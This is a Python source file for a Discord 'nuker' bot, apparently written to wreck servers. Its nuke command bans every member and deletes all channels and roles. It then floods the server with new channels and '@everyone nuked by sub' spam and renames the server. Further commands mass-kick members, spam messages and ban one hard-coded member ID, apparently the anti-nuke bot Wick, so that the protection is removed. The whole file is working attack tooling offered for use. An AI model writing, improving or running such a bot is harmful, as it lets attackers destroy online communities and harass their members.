import discord, os, time, sys, json, random
from colored import fg
from discord.ext import commands

with open('icon.png', 'rb') as f:
    icon = f.read() 

with open('banner.png', 'rb') as f:
    banner = f.read()

with open('config.json', 'r') as f:
    config = json.load(f)

token = config.get("token")
prefix = config.get("prefix")

serverName = config.get("server-name")

spamMessage = config.get("spam-message")
spamAmount = config.get("spam-amount")

roleNames = config.get("role-names")
roleAmount = config.get("role-amount")
channelNames = config.get("channel-names")
channelAmount = config.get("channel-amount")

c1 = fg(config.get("color"))
c2 = fg('#7d7d7d')
c3 = fg('#ff2929')
c4 = fg('#e0e0e0')

user = commands.Bot(help_command=None, command_prefix=prefix, case_insensitive=True,intents=discord.Intents.all())

os.system('title ')

def clear():
    os.system('cls')

def typing(text):
    for char in text:
        time.sleep(0.001)
        sys.stdout.write(char)
        sys.stdout.flush()
        
def runBot(token):
    try:
        user.run(token)
    except Exception as error:
        clear()
        print(f'{c3}[{c2}-{c3}] {c3}Invalid or unsuitable token was set!')
        time.sleep(0.1)
        print(f'{c3}[{c2}-{c3}] {c3}Make sure to enable gateaway intents!')
        time.sleep(1)
        print(c1 + error)
        input()
        
def main():   
    clear()
    print(c1 + f'''
    dMMMMb  dMP dMP dMP dMP dMMMMMP dMP dMMMMMMP 
   dMP dMP dMP dMP dMP.dMP dMP     amr    dMP    
  dMP dMP dMP dMP dMMMMK" dMMMP   dMP    dMP     
 dMP dMP dMP.aMP dMP"AMF dMP     dMP    dMP      
dMP dMP  VMMMP" dMP dMP dMMMMMP dMP    dMP    
    ''')
    time.sleep(1.5)
    typing(f'{c2}[{c1}+{c2}] {c4}Console connected to bot successfully with {c1}{round(user.latency * 1000)}ms')
    time.sleep(1)
    print(f"""

                        ╔═════════════════════════════════════════════════════════════════╗
                        ║ {c2}[{c1}1{c2}] {c4}Nuke            {c1} {c2}[{c1}2{c2}] {c4}Create channels {c1} {c2}[{c1}3{c2}] {c4}Create roles      {c1}║  
                        {c1}║ {c2}[{c1}4{c2}] {c4}Ban members     {c1} {c2}[{c1}5{c2}] {c4}Kick members    {c1} {c2}[{c1}6{c2}] {c4}Delete roles      {c1}║ 
                        {c1}║ {c2}[{c1}7{c2}] {c4}Delete channels {c1} {c2}[{c1}8{c2}] {c4}Ban Wick{c1}                               ║
                        ╚═════════════════════════════════════════════════════════════════╝
    """)

@user.event
async def on_ready():
    main()

@user.command()
async def nuke(ctx):
    await ctx.message.delete()
    clear()
    for member in ctx.guild.members:
        try:
            await member.ban(reason=None)
            print(f"{c2}[{c1}-{c2}] {c4}Banned {member.name}#{member.discriminator} successfully {c1}| {c2}{round(user.latency * 1000)}ms")
        except discord.Forbidden:
            print(f"{c2}[{c1}+{c2}] {c4}Couldn't ban {member.name}#{member.discriminator} {c1}| {c2}{round(user.latency * 1000)}ms")
            pass
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"{c2}[{c1}-{c2}] {c4}Deleted channel {c2}(#{channel.name}) {c1}| {c2}{round(user.latency * 1000)}ms")
        except discord.Forbidden:
            os.system('cls')
            print(f"{c2}[{c1}+{c2}] {c4}Couldn't delete channel {c2}(#{channel.name}){c1}| {c2}{round(user.latency * 1000)}ms")
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print(f"{c2}[{c1}-{c2}] {c4}Deleted role {c2}({role.name}) {c1}| {c2}{round(user.latency * 1000)}ms")
        except Exception:
            print(f"{c2}[{c1}+{c2}] {c4}Couldn't delete role {c2}({role.name}){c1}| {c2}{round(user.latency * 1000)}ms")
            pass
    for i in range(channelAmount):
        try:
            await ctx.guild.create_text_channel(name=random.choice(channelNames))
            print(f"{c2}[{c1}-{c2}] {c4}Created channel named nuked by sub {c1}| {c2}{round(user.latency * 1000)}ms")
        except discord.Forbidden:
            os.system('cls')
            print(f"{c2}[{c1}+{c2}] {c4}Couldn't create channel {c1}| {c2}{round(user.latency * 1000)}ms")
            pass
    for i in range(int(spamAmount)):
        for channel in ctx.guild.channels:
            try:
                await channel.send("@everyone nuked by sub")
                print(f"{c2}[{c1}+{c2}] {c4}Sent message in {channel.name} {c1}| {c2}{round(user.latency * 1000)}ms")
            except discord.Forbidden:
                print(f"{c2}[{c1}+{c2}] {c4}Bot was rate-limited {c1}| {c2}{round(user.latency * 1000)}ms")
    try:
        await ctx.guild.edit(
            name="nuked by sub😹",
            description="epic!!",
            icon=icon,
            banner=banner
        )  
        print(f"{c2}[{c1}+{c2}] {c4}Changed server icon and name{c1}| {c2}{round(user.latency * 1000)}ms")
    except discord.Forbidden:
        print(f"{c2}[{c1}+{c2}] {c4}Bot was rate-limited {c1}| {c2}{round(user.latency * 1000)}ms")
    
    print(f"{c2}[{c1}+{c2}] {c4}Returning back to menu in 5 seconds")
    time.sleep(5)
    os.system('cls')
    main()
    
@user.command()
async def delchannels(ctx):
    await ctx.message.delete()
    clear()
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"{c2}[{c1}-{c2}] {c4}Deleted channel {c2}(#{channel.name}) {c1}| {c2}{round(user.latency * 1000)}ms")
        except discord.Forbidden:
            os.system('cls')
            print(f"{c2}[{c1}+{c2}] {c4}Couldn't delete channel {c2}(#{channel.name}){c1}| {c2}{round(user.latency * 1000)}ms")
            pass

    print(f"{c2}[{c1}+{c2}] {c4}Returning back to menu in 5 seconds")
    time.sleep(5)
    os.system('cls')
    main()

@user.command()
async def delroles(ctx):
    await ctx.message.delete()
    clear()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print(f"{c2}[{c1}-{c2}] {c4}Deleted role {c2}({role.name}) {c1}| {c2}{round(user.latency * 1000)}ms")
        except Exception:
            print(f"{c2}[{c1}+{c2}] {c4}Couldn't delete role {c2}({role.name}){c1}| {c2}{round(user.latency * 1000)}ms")
            pass

    print(f"{c2}[{c1}+{c2}] {c4}Returning back to menu in 5 seconds")
    time.sleep(5)
    os.system('cls')
    main()
        
@user.command()
async def createchannels(ctx):
    await ctx.message.delete()
    clear()
    for i in range(channelAmount):
        try:
            channelName = random.choice(channelNames)
            
            await ctx.guild.create_text_channel(name=channelName)
            print(f"{c2}[{c1}-{c2}] {c4}Created channel named {channelName} {c1}| {c2}{round(user.latency * 1000)}ms")
        except discord.Forbidden:
            os.system('cls')
            print(f"{c2}[{c1}+{c2}] {c4}Couldn't create channel {c1}| {c2}{round(user.latency * 1000)}ms")
            pass

    print(f"{c2}[{c1}+{c2}] {c4}Returning back to menu in 5 seconds")
    time.sleep(5)
    os.system('cls')
    main()

@user.command()
async def banall(ctx):
    await ctx.message.delete()
    clear()
    for member in ctx.guild.members:
        try:
            await member.ban(reason=None)
            print(f"{c2}[{c1}-{c2}] {c4}Banned {member.name}#{member.discriminator} successfully {c1}| {c2}{round(user.latency * 1000)}ms")
        except discord.Forbidden:
            print(f"{c2}[{c1}+{c2}] {c4}Couldn't ban {member.name}#{member.discriminator} {c1}| {c2}{round(user.latency * 1000)}ms")
            pass
        
    print(f"{c2}[{c1}+{c2}] {c4}Returning back to menu in 5 seconds")
    time.sleep(5)
    os.system('cls')
    main()

@user.command()
async def kickall(ctx):
    await ctx.message.delete()
    clear()
    for member in ctx.guild.members:
        try:
            await member.kick()
            print(f"{c2}[{c1}-{c2}] {c4}Kicked {member.name}#{member.discriminator} successfully {c1}| {c2}{round(user.latency * 1000)}ms")
        except discord.Forbidden:
            print(f"{c2}[{c1}+{c2}] {c4}Couldn't kick {member.name}#{member.discriminator} {c1}| {c2}{round(user.latency * 1000)}ms")
            pass
            
    print(f"{c2}[{c1}+{c2}] {c4}Returning back to menu in 5 seconds")
    time.sleep(5)
    os.system('cls')
    main()

@user.command()
async def createroles(ctx):
    roleColor = c1.replace("#", "0x")
    
    await ctx.message.delete()
    clear()
    for i in range(roleAmount):
        roleName = random.choice(roleNames)
        
        try:
            await ctx.guild.create_role(name=random.choice(roleName), color=roleColor)
            print(f"{c2}[{c1}+{c2}] {c4}Successfully created role named {roleName} {c1}| {c2}{round(user.latency * 1000)}ms")
        except discord.Forbidden:
            print(f"{c2}[{c1}+{c2}] {c4}Couldn't create role {c1}| {c2}{round(user.latency * 1000)}ms")
            pass
            
    print(f"{c2}[{c1}+{c2}] {c4}Returning back to menu in 5 seconds")
    time.sleep(5)
    os.system('cls')
    main()

@user.command()
async def banwick(ctx):
    await ctx.message.delete()
    clear()
    for member in ctx.guild.members:
        if member.id == 536991182035746816:
            try:
                await member.ban()
                print(f"{c2}[{c1}+{c2}] {c4}Banned Wick successfully {c1}| {c2}{round(user.latency * 1000)}ms")
                break
            except Exception:
                print(f"{c2}[{c1}+{c2}] {c4}Wick was found but bot did not have enough permissions to ban {c1}| {c2}{round(user.latency * 1000)}ms")
                pass
        else:
            print(f"{c2}[{c1}+{c2}] {c4}Wick was not found in guild {c1}| {c2}{round(user.latency * 1000)}ms")

    print(f"{c2}[{c1}+{c2}] {c4}Returning back to menu in 5 seconds")
    time.sleep(5)
    os.system('cls')
    main()
    
@user.command()
async def spam(ctx):
    await ctx.message.delete()
    clear()
    for i in range(spamAmount):
        for channel in ctx.guild.channels:
            try:
                await channel.send(spamMessage)
                print(f"{c2}[{c1}+{c2}] {c4}Sent message in {channel.name} {c1}| {c2}{round(user.latency * 1000)}ms")
            except discord.Forbidden:
                print(f"{c2}[{c1}+{c2}] {c4}Bot was rate-limited {c1}| {c2}{round(user.latency * 1000)}ms")

    print(f"{c2}[{c1}+{c2}] {c4}Returning back to menu in 5 seconds")
    time.sleep(5)
    os.system('cls')
    main()

runBot(token)